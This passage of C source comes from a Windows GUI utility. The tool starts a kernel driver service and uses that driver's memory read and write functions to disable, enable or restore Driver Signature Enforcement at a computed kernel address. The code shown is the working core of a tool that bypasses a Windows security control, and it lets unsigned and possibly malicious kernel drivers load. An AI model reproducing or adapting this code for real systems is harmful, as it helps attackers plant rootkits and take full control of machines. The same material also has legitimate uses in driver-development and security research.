		MessageBox(g.Dlg1.hDialog1,"Can't stop and delete service!","Error",16);
		rc = 9;
		goto cleanup;
	}

	SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Creating and starting service...");

	// create and start service
	if(g.vd[sel].pFunctionStartDriver(&g.vd[sel]) != 0)
	{
		MessageBox(g.Dlg1.hDialog1,"Can't create and start service!","Error",16);
		rc = 10;
		goto cleanup;
	}

	SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Opening driver device handle...");

	// open driver device handle
	HANDLE hDevice;
	//lint -e{1773} Warning 1773: Attempt to cast away const (or volatile)
	if(g.vd[sel].pFunctionOpenDevice((char*)g.vd[sel].szDriverSymLink,&hDevice) != 0)
	{
		MessageBox(g.Dlg1.hDialog1,"Can't open driver device handle!","Error",16);
		rc = 11;
		goto cleanup;      
	}

	// this is done for every thread task
	if(tp->ttno == ThreadTaskReadDSEOnFirstRun || tp->ttno == ThreadTaskDisableDSE || tp->ttno == ThreadTaskEnableDSE || tp->ttno == ThreadTaskRestoreDSE)
	{
		sprintf(g.szMsg,"Reading %s at address 0x%.16I64X...",g.pd.szVariableName,g.pd.ui64PatchAddress);
		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)g.szMsg);

		// read DSE value
		g.pd.dwDSEActualValue = 0xFFFFFFFF;
		if(g.vd[sel].pFunctionReadMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,&g.pd.dwDSEActualValue) != 0)
		{
			sprintf(g.szMsg,"Can't read %s at address 0x%.16I64X...",g.pd.szVariableName,g.pd.ui64PatchAddress);
			MessageBox(g.Dlg1.hDialog1,g.szMsg,"Error",16);
			CloseHandle(hDevice);
			rc = 12;
			goto cleanup;
		}

		// set original DSE value on first run of dialog GUI
		if(tp->ttno == ThreadTaskReadDSEOnFirstRun)
		{
			g.pd.dwDSEOriginalValue = g.pd.dwDSEActualValue;
		}
	}

	// disable DSE
	if(tp->ttno == ThreadTaskDisableDSE)
	{
		// check if DSE is already disabled
		if(g.pd.dwDSEActualValue == 0)
		{
			// ask user if he wants to continue if DSE is already disabled
			if(MessageBox(g.Dlg1.hDialog1,"DSE is already disabled on the system!\nDo you want to continue?","Question",MB_YESNO | MB_ICONQUESTION) == IDNO)
			{
				// leave
				SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Aborted by user due to already disabled DSE");
				CloseHandle(hDevice);
				rc = 13;
				goto cleanup;
			}
		}

		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Disabling DSE...");

		// disable DSE
		if(g.vd[sel].pFunctionWriteMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,g.pd.dwDSEDisableValue) != 0)
		{
			MessageBox(g.Dlg1.hDialog1,"Can't disable DSE!","Error",16);
			CloseHandle(hDevice);
			rc = 14;
			goto cleanup;
		}
	}
	// enable DSE
	else if(tp->ttno == ThreadTaskEnableDSE)
	{
		// check if DSE is already enabled
		if(g.pd.dwDSEActualValue != 0)
		{
			// ask user if he wants to continue if DSE is already enabled
			if(MessageBox(g.Dlg1.hDialog1,"DSE is already enabled on the system!\nDo you want to continue?","Question",MB_YESNO | MB_ICONQUESTION) == IDNO)
			{
				// leave
				SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Aborted by user due to already enabled DSE");
				CloseHandle(hDevice);
				rc = 15;
				goto cleanup;
			}
		}

		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Enabling DSE...");

		// enable DSE
		if(g.vd[sel].pFunctionWriteMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,g.pd.dwDSEEnableValue) != 0)
		{
			MessageBox(g.Dlg1.hDialog1,"Can't enable DSE!","Error",16);
			CloseHandle(hDevice);
			rc = 16;
			goto cleanup;
		}
	}
	// restore DSE
	else if(tp->ttno == ThreadTaskRestoreDSE)
	{
		// check if DSE is already restored
		if(g.pd.dwDSEActualValue == g.pd.dwDSEOriginalValue)
		{
			// ask user if he wants to continue if DSE is already restored to the original value
			if(MessageBox(g.Dlg1.hDialog1,"DSE is already restored to the original value on the system!\nDo you want to continue?","Question",MB_YESNO | MB_ICONQUESTION) == IDNO)
			{
				// leave
				SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Aborted by user due to already restored DSE");
				CloseHandle(hDevice);
				rc = 17;
				goto cleanup;
			}
		}

		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Restoring DSE...");

		// restore DSE
		if(g.vd[sel].pFunctionWriteMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,g.pd.dwDSEOriginalValue) != 0)
		{
			MessageBox(g.Dlg1.hDialog1,"Can't restore DSE!","Error",16);
			CloseHandle(hDevice);
			rc = 18;
			goto cleanup;
		}
	}

	// read DSE value again for disable, enable and restore DSE task
	if(tp->ttno == ThreadTaskDisableDSE || tp->ttno == ThreadTaskEnableDSE || tp->ttno == ThreadTaskRestoreDSE)
	{
		sprintf(g.szMsg,"Reading %s at address 0x%.16I64X...",g.pd.szVariableName,g.pd.ui64PatchAddress);
		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)g.szMsg);

		// read DSE value
		g.pd.dwDSEActualValue = 0xFFFFFFFF;
		if(g.vd[sel].pFunctionReadMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,&g.pd.dwDSEActualValue) != 0)
		{
			sprintf(g.szMsg,"Can't read %s at address 0x%.16I64X...",g.pd.szVariableName,g.pd.ui64PatchAddress);
			MessageBox(g.Dlg1.hDialog1,g.szMsg,"Error",16);
			CloseHandle(hDevice);
			rc = 19;
			goto cleanup;
		}
	}

	// close device handle
	CloseHandle(hDevice);

	// set DSE status
	if(g.pd.dwDSEActualValue == 0)
	{
		g.pd.szDSEStatus = "disabled";
	}
	else
	{
		g.pd.szDSEStatus = "enabled";
	}

	// update static control with patch data
	MyUpdateStaticControlWithPatchData(&g.pd,tp->ttno,g.Dlg1.hStatic1);

	// show success message in status bar
	if(tp->ttno == ThreadTaskReadDSEOnFirstRun)
	{
		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"DSE Status successfully retrieved");
	}
	else
	{
		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"DSE Status successfully changed");
	}

cleanup:
	// stop and delete service
	if(sel >= 0 && g.vd[sel].szServiceName[0] != 0 && g.vd[sel].driverFile[0].szFilePath[0] != 0)
	{
		//lint -e{534} Warning 534: Ignoring return value of function
		g.vd[sel].pFunctionStopDriver(&g.vd[sel]);
	}

	// kill timer
	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 2) int to unsigned long long
	KillTimer(g.Dlg1.hDialog1,1);
	// enable dialog controls
	//lint -e{534} Warning 534: Ignoring return value of function
	MyDlg1EnableControls(1);
	// set ucRunning to zero
	g.ucRunning = 0;

	return rc;
}

